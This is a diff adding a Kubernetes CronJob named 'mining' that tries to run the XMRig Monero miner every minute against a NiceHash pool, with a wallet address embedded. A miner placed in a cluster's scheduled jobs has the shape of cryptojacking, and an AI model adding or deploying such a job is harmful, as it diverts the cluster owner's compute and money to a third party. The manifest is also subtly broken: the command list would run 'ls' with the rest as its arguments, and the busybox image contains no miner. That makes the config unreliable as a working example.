@@ -1,0 +1,19 @@
+apiVersion: batch/v1
+kind: CronJob
+metadata:
+  name: mining
+spec:
+  schedule: "* */1 * * *"
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          containers:
+          - name: mining
+            image: busybox
+            imagePullPolicy: IfNotPresent
+            command:
+            - ls
+            - cd xmrig-6.12.2
+            - ./xmrig -o stratum+tcp://randomxmonero.usa-west.nicehash.com:3380 -u 3NwTqUpHyE1bQHF2n99pqMpxh55gfE8qbs -p x -k --nicehash -a rx/0
+          restartPolicy: OnFailure
